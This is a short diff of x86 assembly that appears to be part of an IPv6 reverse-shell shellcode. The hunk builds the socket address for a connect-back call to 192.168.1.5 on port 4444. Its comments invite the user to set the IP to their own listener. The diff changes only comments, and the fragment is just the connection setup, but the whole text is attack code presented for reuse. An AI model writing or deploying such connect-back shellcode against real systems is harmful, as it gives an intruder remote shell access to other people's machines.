@@ -29,11 +29,11 @@ xor eax,eax
 ;connect(sockfd, (struct sockaddr*)&srvaddr, sizeof(srvaddr)); 
 ;int socketcall(int call, unsigned long *args);
 push DWORD eax        ;sin6_scope_id
-push DWORD 0x0501a8c0
+push DWORD 0x0501a8c0 ;MY LOCAL IP = 192.168.1.5 | Can be configured to YOUR's
 push word 0xffff
 push DWORD eax
 push DWORD eax
-push WORD ax		  ;inet_pton(AF_INET6, "::ffff:192.168.1.5", &srvaddr.sin6_addr)| Configurable |
+push WORD ax		      ;inet_pton(AF_INET6, "::ffff:192.168.1.5", &srvaddr.sin6_addr)
 push DWORD eax        ;sin6_flowinfo
 push WORD 0x5c11      ;sin6_port=4444 | 0x5c11 | Configurable |
 push WORD 0x0a        ;AF_INET6
